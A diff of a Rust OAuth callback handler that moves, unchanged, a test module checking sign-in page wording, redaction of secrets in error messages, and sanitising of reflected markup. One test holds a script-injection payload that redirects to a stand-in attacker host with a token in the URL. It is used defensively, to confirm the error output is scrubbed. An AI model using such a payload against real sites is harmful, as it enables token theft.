@@ -148,70 +148,6 @@ async fn handle_connection(
     Ok(CallbackParams { code, state })
 }
 
-#[cfg(test)]
-mod tests {
-    use super::*;
-
-    #[test]
-    fn auth_success_page_is_compact_and_has_no_brand_label_box() {
-        let html = render_auth_response_page(
-            "Signed in",
-            "Your account is connected. You can close this window and return to the app.",
-        );
-
-        assert!(html.contains("Signed in"));
-        assert!(html.contains("return to the app"));
-        assert!(!html.contains("Close window"));
-        assert!(!html.contains("<button"));
-        assert!(!html.contains("Kordi Authentication"));
-        assert!(!html.contains("KORDI AUTHENTICATION"));
-        assert!(!html.contains("text-transform:uppercase"));
-        assert!(!html.contains("Authentication Successful"));
-    }
-
-    #[test]
-    fn auth_error_page_uses_clear_retry_copy_without_internal_details() {
-        let html = render_auth_response_page(
-            "Couldn’t sign in",
-            "The provider did not return a valid code. Try again from the app.",
-        );
-
-        assert!(html.contains("Couldn’t sign in"));
-        assert!(html.contains("Try again from the app"));
-        assert!(!html.contains("Kordi Authentication"));
-        assert!(!html.contains("Missing 'code' parameter"));
-        assert!(!html.contains("OAuth callback"));
-    }
-
-    #[test]
-    fn callback_errors_sanitize_reflected_state_urls_and_markup() {
-        let sensitive_values = vec!["state-secret-123".to_string()];
-        let error = ProviderError::stream_with_sensitive_values(
-            "oauth",
-            "callback",
-            Some(
-                "access_denied: state-secret-123 at https://example.com/callback?code=query-secret",
-            ),
-            Some("access_denied"),
-            &sensitive_values,
-        );
-        let rendered = error.to_string();
-
-        assert!(rendered.contains("[redacted]"));
-        assert!(rendered.contains("https://example.com/callback"));
-        assert!(!rendered.contains("state-secret-123"));
-        assert!(!rendered.contains("query-secret"));
-
-        let markup = ProviderError::stream(
-            "oauth",
-            "callback",
-            Some("<script>window.location='https://evil.test/?token=secret'</script>"),
-            Some("access_denied"),
-        );
-        assert_eq!(markup.to_string(), "Unknown error");
-    }
-}
-
 fn parse_query(query: &str) -> HashMap<String, String> {
     query
         .split('&')
@@ -351,4 +287,68 @@ async fn send_response(stream: &mut tokio::net::TcpStream, status: u16, title: &
     );
     let _ = stream.write_all(response.as_bytes()).await;
     let _ = stream.flush().await;
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn auth_success_page_is_compact_and_has_no_brand_label_box() {
+        let html = render_auth_response_page(
+            "Signed in",
+            "Your account is connected. You can close this window and return to the app.",
+        );
+
+        assert!(html.contains("Signed in"));
+        assert!(html.contains("return to the app"));
+        assert!(!html.contains("Close window"));
+        assert!(!html.contains("<button"));
+        assert!(!html.contains("Kordi Authentication"));
+        assert!(!html.contains("KORDI AUTHENTICATION"));
+        assert!(!html.contains("text-transform:uppercase"));
+        assert!(!html.contains("Authentication Successful"));
+    }
+
+    #[test]
+    fn auth_error_page_uses_clear_retry_copy_without_internal_details() {
+        let html = render_auth_response_page(
+            "Couldn’t sign in",
+            "The provider did not return a valid code. Try again from the app.",
+        );
+
+        assert!(html.contains("Couldn’t sign in"));
+        assert!(html.contains("Try again from the app"));
+        assert!(!html.contains("Kordi Authentication"));
+        assert!(!html.contains("Missing 'code' parameter"));
+        assert!(!html.contains("OAuth callback"));
+    }
+
+    #[test]
+    fn callback_errors_sanitize_reflected_state_urls_and_markup() {
+        let sensitive_values = vec!["state-secret-123".to_string()];
+        let error = ProviderError::stream_with_sensitive_values(
+            "oauth",
+            "callback",
+            Some(
+                "access_denied: state-secret-123 at https://example.com/callback?code=query-secret",
+            ),
+            Some("access_denied"),
+            &sensitive_values,
+        );
+        let rendered = error.to_string();
+
+        assert!(rendered.contains("[redacted]"));
+        assert!(rendered.contains("https://example.com/callback"));
+        assert!(!rendered.contains("state-secret-123"));
+        assert!(!rendered.contains("query-secret"));
+
+        let markup = ProviderError::stream(
+            "oauth",
+            "callback",
+            Some("<script>window.location='https://evil.test/?token=secret'</script>"),
+            Some("access_denied"),
+        );
+        assert_eq!(markup.to_string(), "Unknown error");
+    }
 }
